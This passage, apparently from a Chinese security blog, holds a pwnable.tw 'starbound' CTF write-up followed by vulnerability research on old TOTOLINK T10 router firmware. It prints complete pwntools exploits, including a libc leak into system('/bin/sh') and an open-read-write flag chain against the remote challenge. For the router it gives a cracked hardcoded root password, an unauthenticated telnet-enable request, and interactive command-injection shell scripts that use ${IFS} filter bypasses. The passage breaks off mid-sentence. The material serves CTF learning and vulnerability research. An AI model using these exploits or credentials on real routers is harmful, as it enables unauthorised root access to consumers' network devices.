cmd_set_name()中，byte_80580D0也是bss段的地址，且我们可以控制其内容。\n\n```c\nvoid cmd_go_back()\n{\n  dword_805817C = show_main_menu;\n}\n\nint show_main_menu()\n{\n  int result; // eax\n\n  puts(\"\\n-+STARBOUND v1.0+-\");\n  puts(\"  0. Exit\");\n  puts(\"  1. Info\");\n  puts(\"  2. Move\");\n  puts(\"  3. View\");\n  puts(\"  4. Tools\");\n  puts(\"  5. Kill\");\n  puts(\"  6. Settings\");\n  puts(\"  7. Multiplayer\");\n  __printf_chk(1, \"> \");\n  for ( result = 0; result <= 9; ++result )\n    dword_8058154[result] = (int)cmd_nop;\n  dword_8058158 = (int)cmd_info;\n  dword_805815C = (int)cmd_move;\n  dword_8058160 = (int)cmd_view;\n  dword_8058164 = (int)cmd_build;\n  dword_8058168 = (int)cmd_kill;\n  dword_805816C = (int)cmd_settings;\n  dword_8058170 = (int)cmd_multiplayer;\n  return result;\n}\n\nvoid cmd_settings()\n{\n  dword_805817C = show_settings_menu;\n}\n\nint show_settings_menu()\n{\n  int result; // eax\n\n  if ( dword_80580CC )\n    cmd_view();\n  puts(\"\\n-+STARBOUND v1.0: SETTINGS+-\");\n  puts(\"  0. Exit\");\n  puts(\"  1. Back\");\n  puts(\"  2. Name\");\n  puts(\"  3. IP\");\n  puts(\"  4. Toggle View\");\n  __printf_chk(1, \"> \");\n  for ( result = 0; result <= 9; ++result )\n    dword_8058154[result] = (int)cmd_nop;\n  dword_8058158 = (int)cmd_go_back;\n  dword_805815C = (int)cmd_set_name;\n  dword_8058160 = (int)cmd_set_ip;\n  dword_8058164 = (int)cmd_set_autoview;\n  return result;\n}\n\nint cmd_set_name()\n{\n  int result; // eax\n\n  __printf_chk(1, \"Enter your name: \");\n  result = readn(byte_80580D0, 100u);\n  *(_BYTE *)(result + 0x80580CF) = 0;\n  return result;\n}\n```\n\n计算一下byte_80580D0与dword_8058154两者的距离，因此通过dword_8058154[-33]即可访问到byte_80580D0地址存放的内容。此时已实现控制流劫持。\n\n```python\n>>> hex(0x8058154-0x80580D0)\n'0x84'\n```\n\n# 漏洞利用\n\n程序中：\n\n- 没有后门函数\n- 没有system或execve函数\n- 没有int 80或syscall指令\n- 没有“/bin/sh”字符串\n- 没有给libc\n\n## 方法1：泄露libc版本\n\n首先想到的是，通过泄露libc版本，进而执行one_gadget或构造system(\"/bin/sh\")这种方法。\n\nexp如下，该方法在本地能成功。但是在泄露远程libc版本时，发现泄露不同函数会得到不同libc版本。猜测远程libc是特意改过的，无法用这种方法准确获得system函数在libc中的偏移，故本题放弃使用该方法。\n\n```python\nfrom pwn import *\ncontext(arch=\"i386\",os=\"linux\",log_level=\"debug\")\n\nlibc_elf = ELF(\"./libc-2.27.so\")\nio = process(\"./starbound\")\n# io = remote(\"chall.pwnable.tw\",10202)\n\n# io.recvuntil(\"Landing ...\")\n# gdb.attach(io,\"b *0x804A659 \\n c\")\n\n### 1、往byte_80580D0位置写入目的函数指针，这里选0x08048e48先调整一下栈空间，方便2的利用\nio.recvuntil(\"> \")\nio.sendline(str(6))\nio.recvuntil(\"> \")\nio.sendline(str(2))\nname_e = p32(0x08048e48) \n# 0x08048e48 : add esp, 0x1c ; ret      \n# 0x08048936 : add esp, 8 ; pop ebx ; ret\n\n# printf_chk@plt 0x80489F0\nio.recvuntil(\"name: \")\nio.sendline(name_e)\n\n### 2、根据此时栈空间的情况，构造了如下payload。当1中gadget执行完返回后，会执行puts(read@got)\n### 然后再次返回到0x804A605(main开头)。此时泄露了read函数的真正地址，并拥有重新从main函数执行的能力\npayload = '-33\\x00'+'aaaa'+p32(0x8048b90)+p32(0x804A605)+p32(0x8055054)\n# puts@plt 0x8048b90\n# write@got 0x8055044  --\n# puts@got 0x805509C\n# read@got 0x8055054\nio.recvuntil(\"> \")\nio.sendline(payload)\n\nread_addr = u32(io.recv(4))\nprint \"!!!!read!!!!!\"\nprint hex(read_addr)\nlibc_base = read_addr - libc_elf.symbols[\"read\"] \nsystem_addr = libc_base + libc_elf.symbols[\"system\"]\nprint \"!!!!libc_base!!!!\"\nprint hex(libc_base)\nprint \"!!!!system!!!!\"\nprint hex(system_addr)\n\n### 3、劫持控制流以执行system(\" -33;/bin/sh\\x00\")\nio.recvuntil(\"> \")\nio.sendline(str(6))\nio.recvuntil(\"> \")\nio.sendline(str(2))\nname_e = p32(system_addr)\nio.recvuntil(\"name: \")\nio.sendline(name_e)\npayload = \" -33;/bin/sh\\x00\"     # 相当于命令注入。通过尝试，在-33前加入空格才能利用成功\nio.recvuntil(\"> \")\nio.sendline(payload)\nio.interactive()\n```\n\n## 方法2：ORW\n\n在程序got表中看了看，发现有正好有open、read、write三个函数！这正好可以构造orw！当然在不知flag目录的前提下有点难度，不过pwnable.tw的flag一般在/home/题目名/flag，所以这里取个巧。\n\n需要注意的是，ctf题目中，一般情况下程序中不会打开其他文件，因此进程只有0 1 2 (stdin，stdout，stderr)这三个文件描述符。因此，当我们使用open打开文件后，其fd一定是3。\n\n如果程序中打开了其他文件，依次尝试下4/5/6就行。\n\n```python\nfrom pwn import *\ncontext(arch=\"i386\",os=\"linux\",log_level=\"debug\")\n\n# io = process(\"./starbound\")\nio = remote(\"chall.pwnable.tw\",10202)\n\n# io.recvuntil(\"Landing ...\")\n# # gdb.attach(io,\"b *0x804A659 \\n c\")\n# gdb.attach(io,\"b open \\n c\")\n\ndef send_payload(val1,val2):\n    io.recvuntil(\"> \")\n    io.sendline(str(6))\n    io.recvuntil(\"> \")\n    io.sendline(str(2))\n    name_e = val1\n    io.recvuntil(\"name: \")\n    io.sendline(name_e)\n    payload = val2\n    io.recvuntil(\"> \")\n    io.sendline(payload)\n\n### open(\"/home/starbound/flag\",0)\nval1 = p32(0x08048e48)+\"/home/starbound/flag\\x00\"\nval2 = '-33\\x00'+'aaaa'+p32(0x8048970)+p32(0x804A605)+p32(0x80580D4)+p32(0)\nsend_payload(val1,val2)\n\n### read(3,0x80580F0,0x30)\nval1 = p32(0x08048e48)\nval2 = '-33\\x00'+'aaaa'+p32(0x8048A70)+p32(0x804A605)+p32(3)+p32(0x80580F0)+p32(0x30)\nsend_payload(val1,val2)\n\n### write(1,0x8058F0,0x30)\nval1 = p32(0x08048e48)\nval2 = '-33\\x00'+'aaaa'+p32(0x8048A30)+p32(0x804A605)+p32(1)+p32(0x80580F0)+p32(0x30)\nsend_payload(val1,val2)\n\n### 收flag！\nflag = io.recv(0x20)\nprint flag\n\nio.recvuntil(\">\")\nio.interactive()\n```\n\n## 方法3：ret2dl_runtime_resolve\n\n看了别人的wp，基本上都是用这种方法来做的。这种方法比较保险，但是过程有点复杂。\n\n犯懒了，哪天想起来再补上吧~\n","categories":["CTF"]},{"title":"TOTOLINK T10 旧版本漏洞挖掘和分析","url":"/2021/09/25/analysis-of-totolink-t10/","content":"\n# 开头三步曲\n\n## 运行试试\n\n拿到设备后，第一件事当然是跑起来看看。\n\n本次挖洞练习的目标是TOTOLINK路由器，首先将路由器上电并通过LAN口跟电脑连接起来，然后输入`192.168.0.1`进入路由器配置界面，用户名和密码默认为`admin/admin`。\n\n**解决网络冲突**：进到配置界面的第一件事就是更改路由器的局域网设置，将其网段改成非`192.168.0.x`（我将它改成了`192.168.55.1`）。这一步的目的是防止跟wifi的`192.168.0.1`冲突，我们可以通过`192.168.55.1`进入TOTOLINK的配置网页界面。\n\n**设置上网路由**：电脑同时连上了WIFI（通过无线网卡）和TOTOLINK（通过网线），当我们访问网络时，会走哪条线路呢？答案是根据`route print`打印出的活动路由跃点数（优先级）可以看出，数值越小的，优先级越高，就会选择该通路访问互联网。windows 10中设置跃点数的方式如下：高级网络设置->更改适配器选项->选择某一网卡->属性->Inernet协议版本4->高级->去掉“自动跃点”的勾选->设置接口跃点数为一个较小的值，如5。\n\n**寻找危险功能**：在TOTOLINK的设置页面上，随意点击探索是否有危险功能可以开启后门等。\n\n## 扫描端口\n\n使用`nmap -p 1-65535 192.168.55.1`对路由器进行全端口扫描，查看是否开启ssh（22），telnet（23），mqtt（1883）等端口。\n\n## 获取固件\n\n在[totolink官网](http://www.totolink.cn/home/menu/detail.html?menu_listtpl=download&id=15&ids=36)下载对应版本的固件，我用到的是`V5.9c.1485_B20180122`这个版本。\n\n使用`binwalk -Me xxx`对固件进行解包，解出的内容中，在`squashfs-root/`这个目录下是路由器中文件系统的全部内容，根据这个目录下的文件可以进行逆向分析与漏洞挖掘。\n\n**寻找硬编码**：考虑到后续get shell需要用户名/密码登录系统，先静态在文件系统中寻找是否存在硬编码的情况，对`/etc/passwd`和`/etc/shadow`等文件进行分析。了解以上两个文件，参考如下两篇文章：[/etc/shadow file in Linux Explained with Examples](https://www.computernetworkingnotes.com/linux-tutorials/etc-shadow-file-in-linux-explained-with-examples.html)，[Linux /etc/shadow（影子文件）内容解析（超详细）](http://c.biancheng.net/view/840.html)\n\n本次TOTOLINK设备中，在`/etc/shadow.sample`中找到了root的密码。尝试在[cmd5网站](https://cmd5.com/)上进行密码破解，破解结果为：`cs2012`。\n\n```shell\n$ cat shadow.sample\nroot:$1$BJXeRIOB$w1dFteNXpGDcSSWBMGsl2/:16090:0:99999:7:::\nnobody:*:14495:0:99999:7:::\n```\n\n**疑问：为什么从`/etc/shadow.sample`中得到的是`/etc/shadow`的密码？**\n\n全局搜索字符串\"shadow.sample\"，以下两个文件中存在对这个文件的操作，将该文件复制到/var/shadow了。\n\n```shell\nsquashfs-root$ grep -rin shadow.sample\netc/init.d/rcS:79:cp /etc/shadow.sample /var/shadow\netc/init.d/rcS_GW:79:cp /etc/shadow.sample /var/shadow\n```\n\n另，在binwalk解压的etc目录下查看，发现/etc/passwd软连接到了/var/passwd，那么/etc/passwd的值就是/etc/shadow.sample的值。\n\n```shell\nsquashfs-root/etc$ ls -al\nlrwxrwxrwx  1 bling bling    11 1月  22  2018 passwd -> /var/passwd\nlrwxrwxrwx  1 bling bling    11 1月  22  2018 shadow -> /var/shadow\n```\n\n# 先拿SHELL\n\n## 隐藏的telnet功能\n\n分析固件中web_cste目录下的文件，这些文件就是路由器web服务器中的内容。其中`home.asp`就是我们访问`192.168.55.1`时的主页面。这些文件中，`telnet.asp`首先映入眼帘，这个难道是跟telnet相关的？会不会可以打开telnet功能呢？我们尝试访问一下。\n\n```shell\n~/squashfs-root/web_cste$ ls -al\ntotal 152\ndrwxrwxr-x 10 bling bling  4096 1月  22  2018 .\ndrwxrwxr-x 14 bling bling  4096 1月  22  2018 ..\ndrwxrwxr-x  3 bling bling  4096 1月  22  2018 adm\n-rwxr-xr-x  1 bling bling   627 1月  22  2018 bottom.asp\ndrwxrwxr-x  3 bling bling  4096 8月   7 19:04 cgi-bin\nlrwxrwxrwx  1 bling bling    15 1月  22  2018 config.dat -> /var/config.dat\n-rwxr-xr-x  1 bling bling    59 1月  22  2018 empty1.htm\n-rwxr-xr-x  1 bling bling    41 1月  22  2018 empty2.htm\n-rwxr-xr-x  1 bling bling    59 1月  22  2018 empty3.htm\n-rwxr-xr-x  1 bling bling  1150 1月  22  2018 favicon.ico\ndrwxrwxr-x  3 bling bling  4096 1月  22  2018 firewall\nlrwxrwxrwx  1 bling bling    10 1月  22  2018 fwdir -> /tmp/fwdir\nlrwxrwxrwx  1 bling bling    20 1月  22  2018 fw_ln -> /var/cloudupdate.web\n-rwxr-xr-x  1 bling bling   162 1月  22  2018 goLogin.htm\n-rwxr-xr-x  1 bling bling  2508 1月  22  2018 home.asp\n-rwxr-xr-x  1 bling bling   636 1月  22  2018 index.htm\ndrwxrwxr-x  3 bling bling  4096 1月  22  2018 internet\ndrwxrwxr-x  3 bling bling  4096 1月  22  2018 js\n-rwxr-xr-x  1 bling bling  6686 1月  22  2018 left.asp\n-rwxr-xr-x  1 bling bling  7708 1月  22  2018 login.asp\ndrwxrwxr-x  7 bling bling  4096 1月  22  2018 mobile\ndrwxrwxr-x  3 bling bling  4096 1月  22  2018 style\n-rwxr-xr-x  1 bling bling  1616 1月  22  2018 telnet.asp\n-rwxr-xr-x  1 bling bling  3475 1月  22  2018 test.asp\n-rwxr-xr-x  1 bling bling  3798 1月  22  2018 title.asp\n-rwxr-xr-x  1 bling bling  1039 1月  22  2018 top.asp\ndrwxrwxr-x  3 bling bling  4096 1月  22  2018 wireless\n-rwxr-xr-x  1 bling bling 36999 1月  22  2018 wizard.asp\n-rwxr-xr-x  1 bling bling  6551 1月  22  2018 wizard_connect_state.asp\n```\n\n在浏览器中输入`http://192.168.55.1/telnet.asp`：\n\n- 提示让我们登录 - 那就用`admin/admin`登录\n- 登录后重定向到了设置页面 - 那尝试再次在浏览器中输入`http://192.168.55.1/telnet.asp`访问\n- 此时进入telnet开关界面 - 说明我们可以通过浏览器远程开启或关闭路由器的telnet功能\n- 前台可控or后台可控？ - 使用burpsuite抓包重放，验证\"登录后才能访问telnet功能\"的校验是在前端还是后端。\n\n### burpsuite抓包\n\n以下是抓到的“设置telnet为开”的http post包，可以看到有个Cookie字段。尝试将该Cookie删除后，重发http包控制telnet开关，发现依然能够控制成功。说明路由器的web服务器端并未对登录与否做校验。因此，说明这是一个**前台可控的telnet开关功能**！\n\n```\nPOST /cgi-bin/cstecgi.cgi HTTP/1.1\nHost: 192.168.55.1\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0\nAccept: */*\nAccept-Language: en-GB,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: http://192.168.55.1/telnet.asp\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nX-Requested-With: XMLHttpRequest\nContent-Length: 56\nCookie: SESSION_ID=2:1516628334:2\nConnection: close\n\n{\"topicurl\":\"setting/setTelnetCfg\",\"telnet_enabled\":\"1\"}\n```\n\n### telnet shell\n\n利用上述`telnet.asp`的功能打开telnet，再根据固件中分析到的硬编码root密码，便可拿到路由器的shell了。\n\n```shell\n$ telnet 192.168.55.1\nTrying 192.168.55.1...\nConnected to 192.168.55.1.\nEscape character is '^]'.\n\ncarystdio login: root\nPassword:\nRLX Linux version 2.0\n         _           _  _\n        | |         | ||_|\n   _  _ | | _  _    | | _ ____  _   _  _  _\n  | |/ || |\\ \\/ /   | || |  _ \\| | | |\\ \\/ /\n  | |_/ | |/    \\   | || | | | | |_| |/    \\\n  |_|   |_|\\_/\\_/   |_||_|_| |_|\\____|\\_/\\_/\n\nFor further information check:\nhttp://processor.realtek.com/\n# ls\nbin       etc       init      lighttp   proc      sys       usr       web_cste\ndev       home      lib       mnt       root      tmp       var\n```\n\n### 一键get shell\n\n为了封装以上\"打开telnet\"+\"telnet连接获取shell\"过程，通过一个脚本获得TOTOLINK路由器的shell，于是有了如下脚本：\n\n```python\nfrom pwn import *\n\n#context(log_level=\"debug\")\n\nio = remote(\"192.168.55.1\",80)\nmsg2 = 'POST /cgi-bin/cstecgi.cgi HTTP/1.1\\r\\n'\nmsg2 += 'Host: 192.168.55.1\\r\\n'\nmsg2 += 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0\\r\\n'\nmsg2 += 'Accept: */*\\r\\n'\nmsg2 += 'Accept-Language: en-GB,en;q=0.5\\r\\n'\nmsg2 += 'Accept-Encoding: gzip, deflate\\r\\n'\nmsg2 += 'Referer: http://192.168.55.1/telnet.asp\\r\\n'\nmsg2 += 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8\\r\\n'\nmsg2 += 'X-Requested-With: XMLHttpRequest\\r\\n'\nmsg2 += 'Content-Length: 56\\r\\n'\nmsg2 += 'Connection: close\\r\\n\\r\\n'\nmsg2 += '{\"topicurl\":\"setting/setTelnetCfg\",\"telnet_enabled\":\"1\"}'\n\nio.send(msg2)\nio.close()\n\nsleep(1)\n\naa = process([\"/usr/bin/telnet\",\"192.168.55.1\"])\naa.recvuntil(\"login\")\naa.sendline(\"root\")\naa.recvuntil(\"Password\")\naa.sendline(\"cs2012\")\naa.sendline(\"ls\")\naa.interactive()\n```\n\n用request post的方法：\n\n```python\nfrom pwn import *\nimport requests\n\nresponse = requests.post(\"http://192.168.55.1/cgi-bin/cstecgi.cgi\",data='{\"topicurl\":\"setting/setTelnetCfg\",\"telnet_enabled\":\"1\"}')\n\naa = process([\"/usr/bin/telnet\",\"192.168.55.1\"])\naa.recvuntil(\"login\")\naa.sendline(\"root\")\naa.recvuntil(\"Password\")\naa.sendline(\"cs2012\")\naa.sendline(\"ls\")\naa.interactive()\n```\n\n## 前台命令注入\n\n上一步中，burpsuit抓包重放“telnet开关”对应调用的url是`/cgi-bin/cstecgi.cgi`，所以我首先考虑的是检视一遍`/cgi-bin/`目录下的其他文件，是否存在漏洞。\n\n查看固件中的文件目录，有如下文件，依次检视每个文件。\n\n```shell\n~/squashfs-root/web_cste/cgi-bin$ ls -al\ntotal 92\ndrwxrwxr-x  3 bling bling  4096 8月   7 19:04 .\ndrwxrwxr-x 10 bling bling  4096 1月  22  2018 ..\n-rwxr-xr-x  1 bling bling  8007 1月  22  2018 cstecgi.cgi\n-rwxr-xr-x  1 bling bling  9015 1月  22  2018 downloadFlile.cgi\n-rwxr-xr-x  1 bling bling   402 1月  22  2018 ExportSettings.sh\n-rwxr-xr-x  1 bling bling   383 1月  22  2018 ExportSyslog.sh\ndrwxrwxr-x  6 bling bling  4096 1月  22  2018 .svn\n-rwxr-xr-x  1 bling bling 13671 1月  22  2018 upload_bootloader.cgi\n-rwxr-xr-x  1 bling bling 16855 1月  22  2018 upload.cgi\n-rwxr-xr-x  1 bling bling 12503 1月  22  2018 upload_settings.cgi\n```\n\nIDA逆向查看这些cgi文件，发现大量`system`函数的调用。想到是否会存在命令注入漏洞，因此查看了所有的system调用点，确认参数是否外部可控。最终在`downloadFlile.cgi`的main函数中找到如下漏洞：\n\n> 这个漏洞基本就是个webshell\n\n```c\n  v14 = (const char *)getenv(\"QUERY_STRING\");       //从QUERY_STRING中解析的值给v14\n  memset(v24, 0, sizeof(v24));\n  memset(v25, 0, sizeof(v25));\n  sprintf(v24, \"echo QUERY_STRING:%s >/tmp/download\", v14);     //v14被格式化成一个字符串\n  system(v24);          //字符串被当做命令执行，并未检查v14中是否有特殊字符串。最终导致命令注入\n```\n\n用一个简单的url就能触发以上漏洞：\n\n```bash\n#在浏览器中输入以下链接，${IFS}中的IFS是linux系统的一个变量，用这种方式可以生成一个空格，可绕过字符串传输过程中对空格的过滤\nhttp://192.168.55.1/cgi-bin/downloadFlile.cgi?a=b;ls${IFS}-al;\n\n#返回如下，将路由器中的目录及文件信息打印了出来\nQUERY_STRING:a=b\ndrwxr-xr-x    3 root     root            0 Jan  1  1970 .\ndrwxr-xr-x   10 root     root            0 Jan  1  1970 ..\ndrwxr-xr-x    6 root     root            0 Jan  1  1970 .svn\n-rwxr-xr-x    1 root     root          402 Jan  1  1970 ExportSettings.sh\n-rwxr-xr-x    1 root     root          383 Jan  1  1970 ExportSyslog.sh\n-rwxr-xr-x    1 root     root         8007 Jan  1  1970 cstecgi.cgi\n-rwxr-xr-x    1 root     root         9015 Jan  1  1970 downloadFlile.cgi\n-rwxr-xr-x    1 root     root        16855 Jan  1  1970 upload.cgi\n-rwxr-xr-x    1 root     root        13671 Jan  1  1970 upload_bootloader.cgi\n-rwxr-xr-x    1 root     root        12503 Jan  1  1970 upload_settings.cgi\n```\n\n### 使用pwntools完成利用脚本\n\nburpsuite中抓包如下，通过改变url中两个`;`之间的命令（也可用其他有效分隔符），可以实现命令注入，并将命令执行结果返回（`lighthttpd`的特性，把cgi运行的结果用于返回）。\n\n```\nGET /cgi-bin/downloadFlile.cgi?a=b;ls${IFS}-al; HTTP/1.1\nHost: 192.168.55.1\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-GB,en;q=0.5\nAccept-Encoding: gzip, deflate\nConnection: close\nUpgrade-Insecure-Requests: 1\nCache-Control: max-age=0\n```\n\n利用python脚本，将以上过程封装成shell形式\n\n```python\nfrom pwn import *\n\n# context(log_level=\"debug\")\n\nmsg1 = \"GET /cgi-bin/downloadFlile.cgi?\"\nmsg2 = \" HTTP/1.1\\r\\n\"\nmsg2 += \"Host: 192.168.55.1\\r\\n\"\nmsg2 += \"User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0\\r\\n\"\nmsg2 += \"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\\r\\n\"\nmsg2 += \"Accept-Language: en-GB,en;q=0.5\\r\\n\"\nmsg2 += \"Accept-Encoding: gzip, deflate\\r\\n\"\nmsg2 += \"Connection: close\\r\\n\"\nmsg2 += \"Upgrade-Insecure-Requests: 1\\r\\n\"\nmsg2 += \"Cache-Control: max-age=0\\r\\n\"\nmsg2 += \"\\r\\n\"\n\nprint \"Hello, welcome to magic TOTOLINK shell!\"\nprint \"You can use it like a linux shell\"\nprint \"Enjoy it yourself now~\"\n\nwhile(1):\n    try:\n        print \"$ \",\n        a = raw_input()\n        b = \"\"\n        for i in a:\n            if i == ' ':\n                b += \"${IFS}\"\n            elif(i == '\\n'):\n                break\n            else:\n                b += i\n        in_cmd = \"aabbcc;\"+b+\";\"\n        msg_send = msg1 + in_cmd + msg2\n        # print msg_send\n        io = remote(\"192.168.55.1\",80)\n        io.send(msg_send)\n        test_msg = io.recvuntil(\"aabbcc\\n\")\n        recv_msg = io.recv()\n        print recv_msg\n        io.close()\n    except:\n        pass\n```\n\n### 使用requests完成利用脚本\n\n最终的脚本如下：\n\n```python\nimport requests\n\nmsg1 = 'aabb;'\nmsg2 = ';'\n\nwhile(1):\n    print '$',\n    a = raw_input()\n    b = ''\n    for i in a:\n        if i == ' ':\n            b += \"$IFS$1\"\n        elif(i == '\\n'):\n            break\n        else:\n            b += i\n    msg3 = msg1 + b + msg2\n\n    response = requests.get(\"http://192.168.55.1/cgi-bin/downloadFlile.cgi\",params=msg3)\n\n    print response.text.replace(\"QUERY_STRING:aabb\",'')\n```\n\n这个过程中，遇到了以下问题：\n\n1、如何用python中request模块来发包？\n\n参考[python——Request模块](https://blog.csdn.net/qq_37616069/article/details/80376776)\n\n2、使用`response = requests.get(\"http://192.168.55.1/cgi-bin/downloadFlile.cgi?aabb;ls${IFS}-al;\")`无法成功得到返回值？\n\n第一步，定位问题。\n\nrequest.get()发包会自动将'{ }'进行编码，使用wireshark抓包查看如下。\n\n```\nGET /cgi-bin/downloadFlile.cgi?aabb;ls$%7BIFS%7D-al; HTTP/1.1\nHost: 192.168.55.1\n```\n\n而服务端漏洞触发点还未到解码的位置，导致`system(ls$%7BIFS%7D-al)`无法被当做bash命令执行。\n\n第二步，寻找解决方案。\n\na）尝试关闭requests.get()发包自动编码的功能，google查询一通后，发现除了改requests源码无其他办法。故放弃。\n\nb）尝试搜索\"IFS 命令注入\"，寻找是否有其他的方法达到`${IFS}`同样的效果。果然！在[命令注入绕过方式总结](https://uuzdaisuki.com/2020/07/15/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/)这篇文章中找到了办法，如下。\n\n```shell\n###空格绕过###\ncat${IFS}flag.txt\ncat$IFS$1flag.txt\ncat${IFS}$1flag.txt\n```\n\nshell中$0,$1,$?等都是特殊变量，在shell中`echo $0 $1 $2 'a'`，可观察到`$1`和`$2`为空，`$0`为bash，其实是因为起bash时其参数为空。详细参考[shell编程学习笔记之特殊变量](https://www.cnblogs.com/zhuandshao/p/7193564.html)。\n\n3、python字符串的操作不熟悉\n\n```shell\n>>> dir('aaa')\n['__add__', '__class__', '__contains__', '__delattr__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__getitem__', '__getnewargs__', '__getslice__', '__gt__', '__hash__', '__init__', '__le__', '__len__', '__lt__', '__mod__', '__mul__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__rmod__', '__rmul__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', '_formatter_field_name_split', '_formatter_parser', 'capitalize', 'center', 'count', 'decode', 'encode', 'endswith', 'expandtabs', 'find', 'format', 'index', 'isalnum', 'isalpha', 'isdigit', 'islower', 'isspace', 'istitle', 'isupper', 'join', 'ljust', 'lower', 'lstrip', 'partition', 'replace', 'rfind', 'rindex', 'rjust', 'rpartition', 'rsplit', 'rstrip', 'split', 'splitlines', 'startswith', 'strip', 'swapcase', 'title', 'translate', 'upper', 'zfill']\n>>> help(''.replace)\n```\n\n**！！！彩蛋！！！**\n\n> 精简版的exp\n\n```python\nimport requests\n\nwhile(1):\n    print '$',\n    a = 'aabb;' + raw_input().replace(' ','$IFS$1') + ';'\n    response = requests.get(\"http://192.168.55.1/cgi-bin/downloadFlile.cgi\",params=a)\n    print response.text.replace(\"QUERY_STRING:aabb\",'')\n```\n\n# 业务分析 - where is telnet ?\n\n虽然上一步骤中实现了任意开关telnet，但作为一个案例，还是想一探究竟固件中真正去做开关动作的函数在哪儿。于是有了这一小节的内容。\n\n首先，分析我们抓到的设置telnet的http包：\n\n```\nPOST /cgi-bin/cstecgi.cgi HTTP/1.1\nHost: 192.168.55.1\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0\nAccept: */*\nAccept-Language: en-GB,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: http://192.168.55.1/telnet.asp\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nX-Requested-With: XMLHttpRequest\nContent-Length: 56\nCookie: SESSION_ID=2:1516628334:2\nConnection: close\n\n{\"topicurl\":\"setting/setTelnetCfg\",\"telnet_enabled\":\"1\"}\n```\n\n**1、在cstecgi.cgi中寻找setTelnetCfg和telnet_enable**\n\nIDA中对`cstecgi.cgi`文件搜索了一番，并未找到任何线索。\n\n**2、尝试全局搜索**\n\n全局搜索字符串\"telnet_enable\"和\"setTelnetCfg\"\n\n```shell\nsquashfs-root$ grep -rin telnet_enabled\nweb_cste/telnet.asp:16:         supplyValue(\"telnet_enabled\",rJson['telnet_enabled']);\nweb_cste/telnet.asp:23: postVar['telnet_enabled']=$('#telnet_enabled').val();\nweb_cste/telnet.asp:38:<td><select class=\"select\" id=\"telnet_enabled\">\nBinary file lib/cste_modules/system.so matches\nBinary file lib/libapmib.so matches\nsquashfs-root$ grep -rin setTelnetCfg\nweb_cste/telnet.asp:22: var postVar={\"topicurl\" : \"setting/setTelnetCfg\"};\nBinary file lib/cste_modules/system.so matches\n```\n\ntelnet.asp是前端用来构造http包的，因此无需关注。重点在lib/下的两个.so文件。逐个分析：\n\n1）lib/libapmib.so\n\n在IDA中对libapmib.so进行分析，找到了\"telnet_enable\"字符串，然而并未找到引用位置。暂定该so文件不是分析的目标。\n\n2）lib/cste_modules/system.so\n\n在system.so中找到两处对字符串\"telnet_enable\"的引用，一处是`getTelnetCfg()`，另一处是`setTelnetCfg()`。通过名字就能看出后一个设置telnet是我们要的函数！其源码逻辑如下：\n\n```c\nint __fastcall setTelnetCfg(int a1, int a2, int a3)\n{\n  const char *v5; // $v0\n  int v7[3]; // [sp+18h] [-Ch] BYREF\n\n  v5 = (const char *)websGetVar(a2, \"telnet_enabled\", \"0\");\n  v7[0] = atoi(v5);\n  apmib_set(0x4683, v7);\n  if ( v7[0] == 1 )\n  {\n    system(\"killall telnetd 2> /dev/null\");\n    system(\"telnetd &\");            //这一行开启了telnetd进程\n  }\n  else\n  {\n    system(\"killall telnetd 2> /dev/null\");\n  }\n  apmib_update_web(4);\n  return websSetCfgResponse(a1, a3, \"0\", \"reserv\");\n}\n```\n\n继续跟踪是谁调用了这个函数，跟踪到了system.so中的module_init()函数。\n\n```c\nint module_init()\n{\n  cste_hook_register(\"getPasswordCfg\", getPasswordCfg);\n  cste_hook_register(\"setPasswordCfg\", setPasswordCfg);\n  cste_hook_register(\"NTPSyncWithHost\", NTPSyncWithHost);\n  cste_hook_register(\"getNTPCfg\", &getNTPCfg);\n  cste_hook_register(\"setNTPCfg\", setNTPCfg);\n  cste_hook_register(\"getDDNSStatus\", getDDNSStatus);\n  cste_hook_register(\"getDDNSCfg\", &getDDNSCfg);\n  cste_hook_register(\"setDDNSCfg\", setDDNSCfg);\n  cste_hook_register(\"getSyslogCfg\", &getSyslogCfg);\n  cste_hook_register(\"clearSyslog\", clearSyslog);\n  cste_hook_register(\"setSyslogCfg\", setSyslogCfg);\n  cste_hook_register(\"getMiniUPnPConfig\", &getMiniUPnPConfig);\n  cste_hook_register(\"setMiniUPnPConfig\", setMiniUPnPConfig);\n  cste_hook_register(\"LoadDefSettings\", LoadDefSettings);\n  cste_hook_register(\"RebootSystem\", RebootSystem);\n  cste_hook_register(\"FirmwareUpgrade\", FirmwareUpgrade);\n  cste_hook_register(\"getRebootScheCfg\", getRebootScheCfg);\n  cste_hook_register(\"setRebootScheCfg\", setRebootScheCfg);\n  cste_hook_register(\"getTelnetCfg\", getTelnetCfg);\n  cste_hook_register(\"setTelnetCfg\", setTelnetCfg);             //在这里注册了setTelnetCfg，但是谁调用了这儿呢？\n  cste_hook_register(\"SystemSettings\", SystemSettings);\n  return 0;\n}\n```\n\n**3、整理思路**\n\n现在已知服务器端（路由器）处理设置telnet 